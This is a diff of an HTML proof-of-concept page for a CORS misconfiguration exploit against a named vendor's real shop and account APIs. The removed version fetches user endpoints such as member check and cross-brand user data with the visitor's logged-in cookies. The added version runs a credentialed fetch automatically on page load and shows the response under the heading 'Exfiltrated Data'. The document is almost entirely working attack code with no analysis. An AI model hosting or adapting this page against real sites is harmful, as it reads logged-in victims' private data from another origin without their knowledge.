@@ -1,43 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>OPPO CORS PoC</title>
+  <title>OPPO CORS Exploit PoC</title>
 </head>
 <body>
-  <h2>OPPO CORS Exploit PoC</h2>
-
-  <select id="endpoint">
-    <option value="https://www.opposhop.cn/cn/oapi/users/web/member/check">
-      Member Check
-    </option>
-    <option value="https://www.opposhop.cn/cn/oapi/users/web/couponsCenter/getPurposeCoupons?code=good_coupons&scene=couponCenter">
-      Get Purpose Coupons
-    </option>
-    <option value="https://www.opposhop.cn/cn/oapi/users/web/couponsCenter/getSecKillCoupons?code=everyday_coupons_center">
-      Get SecKill Coupons
-    </option>
-    <option value="https://id.opposhop.cn/api/user/cross-brand">
-      Cross Brand User
-    </option>
-  </select>
-
-  <button onclick="runPoC()">Run PoC</button>
+  <h2>Exfiltrated Data from OPPO API</h2>
   <pre id="output"></pre>
-
   <script>
-    async function runPoC() {
-      const endpoint = document.getElementById("endpoint").value;
-      try {
-        let res = await fetch(endpoint, {
-          method: "GET",
-          credentials: "include" // use logged-in cookies
-        });
-        let text = await res.text();
-        document.getElementById("output").innerText = text;
-      } catch (e) {
-        document.getElementById("output").innerText = "Error: " + e;
-      }
-    }
+    fetch("https://www.opposhop.cn/cn/oapi/configs/web/icons/700002", {
+      method: "GET",
+      credentials: "include"
+    })
+    .then(r => r.text())
+    .then(data => {
+      document.getElementById("output").innerText = data;
+    })
+    .catch(e => {
+      document.getElementById("output").innerText = "Error: " + e;
+    });
   </script>
 </body>
 </html>
